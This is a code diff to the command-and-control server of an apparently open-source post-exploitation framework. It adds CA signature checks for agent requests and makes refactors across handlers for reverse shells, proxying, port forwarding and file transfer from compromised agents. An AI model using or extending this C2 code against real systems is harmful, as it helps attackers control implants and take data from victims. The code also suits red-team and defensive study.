@@ -3,9 +3,9 @@
 
 package cc
 
-
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -34,7 +34,7 @@ import (
 // the same Shadowsocks server on any host that you find convenient
 func ShadowsocksServer() {
 	ctx, cancel := context.WithCancel(context.Background())
-	var ss_config = &ss.SSConfig{
+	ss_config := &ss.SSConfig{
 		ServerAddr:     "0.0.0.0:" + RuntimeConfig.ShadowsocksPort,
 		LocalSocksAddr: "",
 		Cipher:         ss.AEADCipher,
@@ -60,7 +60,7 @@ var (
 // TLSServer start HTTPS server
 func TLSServer() {
 	if _, err := os.Stat(Temp + tun.WWW); os.IsNotExist(err) {
-		err = os.MkdirAll(Temp+tun.WWW, 0700)
+		err = os.MkdirAll(Temp+tun.WWW, 0o700)
 		if err != nil {
 			CliFatalError("TLSServer: %v", err)
 		}
@@ -100,14 +100,40 @@ func TLSServer() {
 func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 	vars := mux.Vars(req)
 
+	// H2Conn for reverse shell and proxy
 	var rshellConn, proxyConn emp3r0r_data.H2Conn
 	RShellStream.H2x = &rshellConn
 	ProxyStream.H2x = &proxyConn
 
-	token := vars["token"]
-	// POST vars
-	var path string
-	path = req.URL.Query().Get("file_to_download")
+	// vars
+	if vars["api"] == "" || vars["token"] == "" {
+		CliPrintDebug("Invalid request: %v, no api/token found, abort", req)
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	// verify agent uuid, is it signed by our CA?
+	agent_uuid := req.Header.Get("AgentUUID")
+	agent_sig, err := base64.URLEncoding.DecodeString(req.Header.Get("AgentUUIDSig"))
+	if err != nil {
+		CliPrintDebug("Failed to decode agent sig: %v, abort", err)
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	isValid, err := tun.VerifySignatureWithCA([]byte(agent_uuid), agent_sig)
+	if err != nil {
+		CliPrintDebug("Failed to verify agent uuid: %v", err)
+	}
+	if !isValid {
+		CliPrintDebug("Invalid agent uuid, refusing request")
+		wrt.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	CliPrintDebug("Header: %v", req.Header)
+	CliPrintDebug("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
+		vars["api"], vars["token"], agent_uuid, agent_sig)
+
+	token := vars["token"] // this will be used to authenticate some requests
 
 	api := tun.WebRoot + "/" + vars["api"]
 	switch api {
@@ -129,6 +155,9 @@ func dispatcher(wrt http.ResponseWriter, req *http.Request) {
 		wrt.WriteHeader(http.StatusBadRequest)
 
 	case tun.FileAPI:
+		var path string
+		path = req.URL.Query().Get("file_to_download")
+
 		if !IsAgentExistByTag(token) {
 			wrt.WriteHeader(http.StatusBadRequest)
 			return
@@ -244,7 +273,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 
 	// FileGetDir
 	if !util.IsExist(FileGetDir) {
-		err = os.MkdirAll(FileGetDir, 0700)
+		err = os.MkdirAll(FileGetDir, 0o700)
 		if err != nil {
 			CliPrintError("mkdir -p %s: %v", FileGetDir, err)
 			return
@@ -257,7 +286,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 	nowSize := util.FileSize(filewrite)
 
 	// open file for writing
-	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0o600)
 	if err != nil {
 		CliPrintError("ftpHandler write file: %v", err)
 	}
@@ -298,7 +327,7 @@ func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) 
 		if sh.H2x.Conn != nil {
 			err = sh.H2x.Conn.Close()
 			if err != nil {
-				CliPrintError("ftpHandler failed to close connection: " + err.Error())
+				CliPrintError("ftpHandler failed to close connection: %v", err)
 			}
 		}
 		sh.Token = ""
@@ -446,7 +475,7 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 		if sh.H2x.Conn != nil {
 			err = sh.H2x.Conn.Close()
 			if err != nil {
-				CliPrintError("portFwdHandler failed to close connection: " + err.Error())
+				CliPrintError("portFwdHandler failed to close connection: %v", err)
 			}
 		}
 
@@ -561,7 +590,7 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 // msgTunHandler JSON message based (C&C) tunnel between agent and cc
 func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 	// updated on each successful handshake
-	var last_handshake = time.Now()
+	last_handshake := time.Now()
 
 	// use h2conn
 	conn, err := h2conn.Accept(wrt, req)
@@ -584,7 +613,7 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
 				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
 				ListTargets()
-				AgentInfoPane.Printf(true, color.HiYellowString("No agent selected"))
+				AgentInfoPane.Printf(true, "%s", color.HiYellowString("No agent selected"))
 				break
 			}
 		}
@@ -635,10 +664,6 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 				return
 			}
 			shortname := agent.Name
-			if agent == nil {
-				CliPrintWarning("msgTunHandler: agent not recognized")
-				return
-			}
 			if Targets[agent].Conn == nil {
 				CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
 				CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
